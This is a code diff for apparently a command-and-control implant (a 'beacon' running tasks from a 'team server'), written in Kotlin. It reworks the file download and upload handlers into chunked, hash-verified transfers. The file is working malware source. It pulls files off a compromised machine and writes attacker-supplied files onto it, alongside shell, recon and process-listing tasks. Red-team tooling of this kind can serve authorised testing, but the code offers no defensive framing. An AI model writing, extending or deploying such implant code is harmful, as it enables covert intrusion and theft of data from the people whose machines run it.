@@ -3,6 +3,8 @@ package io.umbra.beacon
 import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.IOException
+import java.io.RandomAccessFile
+import java.security.MessageDigest
 import java.util.concurrent.TimeUnit
 
 /** Executes tasks handed out by the team server. */
@@ -10,12 +12,28 @@ object TaskRunner {
     const val MAX_OUTPUT = 900 * 1024
 
     class Outcome(val code: Long, val out: ByteArray, val err: String) {
-        fun toValue(taskId: String): Upk.MapV = Upk.map(
-            "id" to Upk.str(taskId),
-            "code" to Upk.num(code),
-            "out" to Upk.bin(out),
-            "err" to Upk.str(err),
-        )
+        /**
+         * Extra RESULT fields (`total`, `offset`, `eof`, `sha256`, ...). The
+         * server stores the scalars as task metadata, which is what makes a
+         * chunked transfer verifiable.
+         */
+        val extra: MutableList<Pair<String, Upk>> = mutableListOf()
+
+        fun with(key: String, value: Upk): Outcome {
+            extra.add(key to value)
+            return this
+        }
+
+        fun toValue(taskId: String): Upk.MapV {
+            val fields = mutableListOf<Pair<String, Upk>>(
+                "id" to Upk.str(taskId),
+                "code" to Upk.num(code),
+                "out" to Upk.bin(out),
+                "err" to Upk.str(err),
+            )
+            fields.addAll(extra)
+            return Upk.map(*fields.toTypedArray())
+        }
     }
 
     fun shell(command: String, timeoutSec: Long): Outcome {
@@ -87,31 +105,98 @@ object TaskRunner {
             )
             "sysinfo", "recon" -> Outcome(0, SysInfo.report().toByteArray(), "")
             "ls" -> listDir(if (path.isEmpty()) "/" else path)
-            "download", "cat" -> {
-                if (path.isEmpty()) Outcome(1, ByteArray(0), "download requires path")
-                else try {
-                    val data = File(path).readBytes()
-                    Outcome(0, if (data.size > MAX_OUTPUT) data.copyOfRange(0, MAX_OUTPUT) else data, "")
-                } catch (t: Throwable) {
-                    Outcome(1, ByteArray(0), "download: ${t.message}")
-                }
-            }
-            "upload" -> {
-                val data = args.field("data")?.bytes() ?: ByteArray(0)
-                if (path.isEmpty()) Outcome(1, ByteArray(0), "upload requires path")
-                else try {
-                    File(path).writeBytes(data)
-                    Outcome(0, "wrote ${data.size} bytes to $path\n".toByteArray(), "")
-                } catch (t: Throwable) {
-                    Outcome(1, ByteArray(0), "upload: ${t.message}")
-                }
-            }
+            "download", "cat" -> download(
+                path,
+                args.field("offset")?.long() ?: 0,
+                args.field("limit")?.long() ?: MAX_OUTPUT.toLong(),
+            )
+            "upload" -> upload(
+                path,
+                args.field("data")?.bytes() ?: ByteArray(0),
+                args.field("offset")?.long() ?: 0,
+                args.field("eof")?.flag() ?: true,
+            )
             "ps" -> processList()
             "sleep" -> Outcome(0, "sleep interval updated\n".toByteArray(), "")
             "exit", "kill" -> Outcome(0, "beacon exiting\n".toByteArray(), "")
             "ping" -> Outcome(0, "pong\n".toByteArray(), "")
             else -> Outcome(2, ByteArray(0), "unknown task kind \"$kind\"")
         }
+    }
+
+    /**
+     * Read one chunk of a file, mirroring implant/rust/src/task.rs.
+     *
+     * `total`, `offset`, `eof` and a per-chunk SHA-256 make a multi-request
+     * transfer verifiable instead of hopeful.
+     */
+    fun download(path: String, offset: Long, limit: Long): Outcome {
+        if (path.isEmpty()) return Outcome(1, ByteArray(0), "download requires path")
+        val size = limit.coerceIn(1, MAX_OUTPUT.toLong()).toInt()
+        return try {
+            val file = File(path)
+            if (file.isDirectory) return Outcome(1, ByteArray(0), "download $path: is a directory")
+            val total = file.length()
+            if (offset > total) {
+                return Outcome(1, ByteArray(0), "download $path: offset $offset past end ($total)")
+            }
+            val chunk = RandomAccessFile(file, "r").use { raf ->
+                raf.seek(offset)
+                val buf = ByteArray(minOf(size.toLong(), total - offset).toInt())
+                var read = 0
+                while (read < buf.size) {
+                    val n = raf.read(buf, read, buf.size - read)
+                    if (n < 0) break
+                    read += n
+                }
+                if (read == buf.size) buf else buf.copyOfRange(0, read)
+            }
+            val eof = offset + chunk.size >= total
+            Outcome(0, chunk, "")
+                .with("total", Upk.num(total))
+                .with("offset", Upk.num(offset))
+                .with("eof", Upk.bool(eof))
+                .with("sha256", Upk.str(sha256Hex(chunk)))
+        } catch (t: Throwable) {
+            Outcome(1, ByteArray(0), "download: ${t.message}")
+        }
+    }
+
+    /**
+     * Write one chunk at `offset`; offset 0 truncates, so re-sending a shorter
+     * file cannot leave the previous tail behind. The final chunk reports the
+     * whole-file hash.
+     */
+    fun upload(path: String, data: ByteArray, offset: Long, eof: Boolean): Outcome {
+        if (path.isEmpty()) return Outcome(1, ByteArray(0), "upload requires path")
+        return try {
+            RandomAccessFile(File(path), "rw").use { raf ->
+                if (offset == 0L) raf.setLength(0)
+                raf.seek(offset)
+                raf.write(data)
+            }
+            val written = offset + data.size
+            val outcome = Outcome(0, "wrote ${data.size} bytes at offset $offset to $path\n".toByteArray(), "")
+                .with("written", Upk.num(written))
+                .with("eof", Upk.bool(eof))
+            if (eof) {
+                val whole = File(path).readBytes()
+                outcome
+                    .with("total", Upk.num(whole.size.toLong()))
+                    .with("sha256", Upk.str(sha256Hex(whole)))
+            } else {
+                outcome
+            }
+        } catch (t: Throwable) {
+            Outcome(1, ByteArray(0), "upload: ${t.message}")
+        }
+    }
+
+    private fun sha256Hex(data: ByteArray): String {
+        val digest = MessageDigest.getInstance("SHA-256").digest(data)
+        val sb = StringBuilder(digest.size * 2)
+        for (b in digest) sb.append("%02x".format(b.toInt() and 0xff))
+        return sb.toString()
     }
 
     /**
